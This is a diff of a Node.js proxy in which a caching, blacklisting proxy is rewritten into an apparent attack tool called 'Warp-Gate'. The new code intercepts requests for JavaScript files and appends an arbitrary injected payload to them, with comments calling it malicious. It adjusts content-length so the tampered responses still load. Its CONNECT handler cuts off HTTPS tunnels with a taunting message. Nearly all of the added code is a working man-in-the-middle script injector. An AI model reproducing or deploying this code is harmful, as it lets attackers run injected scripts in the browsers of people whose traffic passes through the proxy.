@@ -1,186 +1,107 @@
-var http = require('http'); // for accessing the sockets on http
-var url = require('url'); // for parsing url
-var crypto = require('crypto'); // for creating hashes
-var fs = require('fs'); // for accessing the filesystem
-var readline = require('readline'); // for reading line from console
-var cache = {}; // stores cached objects as key value pairs
-var port = 8180; // sever port
+var url = require('url'), // for parsing url
+    path = require('path'), // for parsing url
+    util = require('./util.js'),
+    zlib = require('zlib'),
+    gzip = zlib.createGzip();
+module.exports = {
 
-var server = http.createServer(function(request, response) {
-  var parseReq = url.parse(request.url, true); // parse the requested url
-  var options = {
-    host: parseReq.host,
-    port: parseReq.port,
-    path: parseReq.path,
-    method: request.method,
-    headers: request.headers,
-  };
-  console.info(request.connection.remoteAddress + ": " + request.method + " " + request.url);
-  // read from blacklist.txt fille
-  fs.readFile('blacklist.txt', 'utf8', function(err, data) {
-    if (data.indexOf(parseReq.hostname) > -1 && !err) { //if the hostname is found return 403 to the user
-      response.writeHead(403, {
-        "Proxy-agent": "Node-Proxy"
-      });
-      response.write("<h1>This site has been blocked by node proxy<h1>");
-      response.end();
-      return false;
-    }
+    run: function(service,port,payload,iOptions){
 
-    // Inject malicious JS shiz..
-    $fileName = options.path.split('/');
-    $fileName = $fileName[$fileName.length -1]; // requested file's name, eg: ga.js?321321
-    if ($fileName.indexOf('.js') > -1 ) { // This file IS a javscript file
-    // download remote file
-    // append malicious code to remote file
-    // return new version of remote file to client)
 
-    http.get(options,function(res) {
+        var warp = function(request,response){
+            var parseReq = url.parse(request.url, true); // parse the requested url
 
-    });
+            var options = {
+                host: parseReq.host,
+                port: parseReq.port,
+                path: parseReq.path,
+                method: request.method,
+                headers: request.headers,
+            };
 
-    if (typeof cache[hash(request.url)] != 'undefined') { // if cached object exist
-      checkFresh(request, response, options); // check if it is fresh
-      return true;
-    }
-    // else retrieve the new cached object
-    var proxy_request = http.request(options, function(proxy_response) {
-      proxy_response.headers['Proxy-agent'] = "Node-Proxy";
-      response.writeHead(proxy_response.statusCode, proxy_response.headers); // start writing the headers back to client
-      var totalchunk = ''; // variable to store the total chunk data
-      proxy_response.addListener('data', function(chunk) { // the returned data is recieved and sent in chunks
-        // acctuall data or body from site
-        totalchunk += chunk.toString('binary'); // concatonate  all the chunks
-        response.write(chunk, 'binary');
-      });
-      proxy_response.addListener('end', function() { // when the server finished sending the data save to cauche and end client connection
-        cacheObj(request.url, proxy_response.headers, totalchunk);
-        response.end();
-      });
-      proxy_response.addListener('error', function(e) { // on server error send 504
-        console.error('Problem with request ', e);
-        sendClient(response, 504, "<h1>504 Gateway Timeout</h1>");
-      });
-    });
-    proxy_request.addListener('error', function(e) { // on server request error send back 504
-      console.error('Error with server ', e);
-      sendClient(response, 504, "<h1>504 Gateway Timeout<h1>");
-    });
-    request.addListener('data', function(chunk) { // when client sends data suck as post data write to the proxy request
-      proxy_request.write(chunk, 'binary');
-    });
-    request.addListener('end', function() { // when the  client has finished requesting end the proxy request
-      proxy_request.end();
-    });
-    request.addListener('error', function(e) { // on client error send back 400
-      console.error('Problem with request ', e);
-      sendClient(response, 400, "<h1>400 Bad Request</h1>");
-    });
-  });
+            // log request
+            console.info(request.connection.remoteAddress + ": " + request.method + " " + request.url);
 
-}).listen(port); // serve listen on specific port
-console.log('Proxy started on port ' + port);
-console.log("Type the site you want to blacklist eg. www.google.com")
-console.log(" Help \n ===== \n rb = Remove Blacklist file \n dl = disable console log")
-var rl = readline.createInterface({ // make the console readable
-  input: process.stdin,
-  output: process.stdout,
-  terminal: false
-});
-rl.setPrompt('Blacklist Site> ');
-rl.prompt(); // set console prompt
+            // check if js file
+            var isJs = false; // lel doesnt work with jquery.fancybox-buttons.js?v=1.0.5
+            //            console.log(options.path)
 
-rl.on('line', function(line) { // on new line add to black list or remove file if rb
-  if (line.trim() == "rb") fs.unlink('blacklist.txt', function(err) {});
-  else if (line.trim() == "dl") {
-    console.info = function() {}
-  } else if (line.trim() == "");
-  else fs.appendFile('blacklist.txt', line + "\r\n", function(err) {}); // add the site name plus endline character and append to the file
-  rl.prompt();
-});
+            if (path.extname(options.path) == ".js") isJs = true;
 
-function hash(value) { // function fro hashing the url
-  var hash = crypto.createHash('md5').update(value).digest('hex');
-  return hash;
-}
 
-function sendClient(response, statuscode, webmsg) { // function to send custom response to the client
-  response.writeHead(statuscode, {
-    "Proxy-agent": "Node-Proxy"
-  });
-  response.end(webmsg);
-}
+            // remove encoding cause its causing issues
+            delete options.headers['accept-encoding']
 
-function returnCacheObj(request, response) { // get cauched object and send back to client
-  var cachepoint = cache[hash(request.url)];
-  response.writeHead(200, cachepoint['recievedheader']);
-  response.write(cachepoint['recievedchunk'], "binary");
-  response.end();
-  console.info('Send back from cache' + request.url);
-}
+            var proxy_request = service.request(options, function(proxy_response) {
+                proxy_response.headers['Proxy-agent'] = "Warp-Gate";
+                // set expires here
+                // add length here
+                if (isJs){
+                    var finLength = parseInt(proxy_response.headers['content-length']) +
+                        Buffer.byteLength(payload, 'utf8');
 
-function cacheObj(url, rsHeaders, tChunk) { // cauche object
-  var timeout = false;
-  if (typeof rsHeaders['expires'] != 'undefined') { // if there is an expires tag in the header
-    var toExpiryMil = Date.parse(rsHeaders['expires']) - Date.now();
-    timeout = setTimeout(function() { // run an anoonymous function that deletes the cauche object when it expires
-      delete cache[hash(url)];
-    }, toExpiryMil); // this is a self destructing variable
-  }
-  cache[hash(url)] = {
-    recievedheader: rsHeaders,
-    recievedchunk: tChunk,
-    timeout: timeout
-  }
-}
+                    proxy_response.headers['content-length'] = finLength;
+                }
+                // start writing the headers back to client
+                response.writeHead(proxy_response.statusCode, proxy_response.headers);
 
-function checkFresh(request, response, options) { // function to check fresh cache
-  var cachepoint = cache[hash(request.url)]; // get cauche point
-  var cachetag = false;
-  // else return cached object
-  if (typeof cachepoint.recievedheader['last-modified'] != 'undefined') { // if last-modify tag exists add the if modified since header and send the request to the server
-    cachetag = true;
-    options.headers['if-modified-since'] = cachepoint.recievedheader['last-modified'];
-  }
-  if (typeof cachepoint.recievedheader['etag'] != 'undefined') { // if last-modify tag exists add the if none match and
-    cachetag = true;
-    options.headers['if-none-match'] = cachepoint.recievedheader['etag'];
-  }
-  if (!cachetag) { // if the above tags dont exist there for the cauche object is returned
-    returnCacheObj(request, response);
-    return true;
-  }
-  checkReq(request, response, options); // send the request to the server
-}
+                // variable to store the total chunk data
+                var totalchunk = '';
 
-function checkReq(request, response, options) { // function to send request to server
-  var proxy_request = http.request(options, function(proxy_response) { // send request
-    proxy_response.headers['Proxy-agent'] = "Node-Proxy";
-    var totalchunk = ''; // variable to store the total chunk data
-    if (proxy_response.statusCode == 304) { // server reponds in 304 not modified then cached object is fresh. Return the cached object
-      console.info("Server responds in 304")
-      returnCacheObj(request, response);
-    } else { // else start sending the new object back to the client by first writing the header to the client
-      console.info("Server responds in 200")
-      response.writeHead(200, proxy_response.headers);
-    }
-    proxy_response.addListener('data', function(chunk) { // when the server responds with data therby it means that the status conde was 200 then return data in chunks
-      totalchunk += chunk.toString('binary'); // concatonate  all the chunks
-      response.write(chunk, 'binary');
-    });
-    proxy_response.addListener('end', function() { // on end of request
-      if (proxy_response.statusCode == 200) { // if ststus code equals 200 then delete the old cache and inser the fresh object to the cache and end the response
-        delete cache[hash(request.url)];
-        cacheObj(request.url, proxy_response.headers, totalchunk);
-        response.end();
-      }
-    });
-  });
-  request.addListener('data', function(chunk) { //starts proxy request by sending the requested "data"
-    proxy_request.write(chunk, 'binary');
-  });
-  request.addListener('end', function() { // ends the request on end
-    proxy_request.end();
-  });
-}
+                proxy_response.addListener('data', function(chunk) { // the returned data is recieved and sent in chunks
+                    // acctuall data or body from site
+                    totalchunk += chunk.toString('binary'); // concatonate  all the chunks
+                    response.write(chunk, 'binary');
+                });
 
+                proxy_response.addListener('end', function() { // when the server finished sending the data save to cauche and end client connection
+                    // append malitious js here
+                    var encoding = proxy_response.headers['content-encoding'];
+                    if (isJs) response.end(payload)
+                    else response.end();
+
+                });
+
+                proxy_response.addListener('error', function(e) { // on server error send 504
+                    console.error('Problem with request ', e);
+                    util.sendClient(response, 504, "<h1>504 Gateway Timeout</h1>");
+                });
+
+            });
+            proxy_request.addListener('error', function(e) { // on server error send 504
+                console.error('Problem with proxy request ', e);
+                util.sendClient(response, 504, "<h1>504 Gateway Timeout</h1>");
+            });
+            // when client sends data suck as post data write to the proxy request
+            request.addListener('data', function(chunk) {
+                proxy_request.write(chunk, 'binary');
+            });
+            // when the  client has finished requesting end the proxy request
+            request.addListener('end', function() {
+                proxy_request.end();
+            });
+            // on client error send back 400
+            request.addListener('error', function(e) {
+                console.error('Problem with client request ', e);
+                util.sendClient(response, 400, "<h1>400 Bad Request</h1>");
+            });
+
+        };
+
+        // where the code stats calling functions
+
+        // check which service to start
+        //        if(iOptions) var server = service.createServer(iOptions,warp).listen(port);
+        var server = service.createServer(warp).listen(port);
+        // using http connect proxy https
+        server.addListener('connect', function(request, socket, head) {
+            var url = request['url'];
+            var httpVersion = request['httpVersion'];
+            socket.write( "HTTP/" + httpVersion + " 200 Connection established\r\n\r\n" );
+
+            socket.write("lel got you");
+            socket.end();
+        });
+    },
+
+};
